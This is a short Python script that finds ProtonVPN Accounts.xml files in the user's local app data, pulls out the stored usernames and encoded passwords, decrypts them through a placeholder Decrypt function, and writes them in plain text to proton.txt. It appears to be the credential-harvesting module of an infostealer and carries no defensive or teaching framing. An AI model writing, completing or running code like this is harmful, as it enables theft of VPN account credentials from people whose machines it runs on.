import os
import xml.etree.ElementTree as ET
from pathlib import Path

proton_dir = Path(os.path.join(Paths.lappdata, "ProtonVPN"))

if not proton_dir.exists():
    exit()

try:
    accounts = []

    for account_file in proton_dir.rglob("Accounts.xml"):
        doc = ET.parse(account_file)
        root = doc.getroot()

        accounts_element = root.find("Accounts")
        if accounts_element is not None:
            for account_element in accounts_element.findall("Account"):
                username = account_element.findtext("Username")
                encoded_password = account_element.findtext("Password")

                if username and encoded_password:
                    password = Decrypt(encoded_password)  # Replace Decrypt with your decryption logic

                    accounts.append(f"Username: {username}\nPassword: {password}\n")

    if accounts:
        output_path = os.path.join(os.getcwd(), "proton.txt")
        with open(output_path, "w") as output_file:
            output_file.write("".join(accounts))
except Exception as e:
    # Handle exceptions here
    print("An error occurred:", str(e))
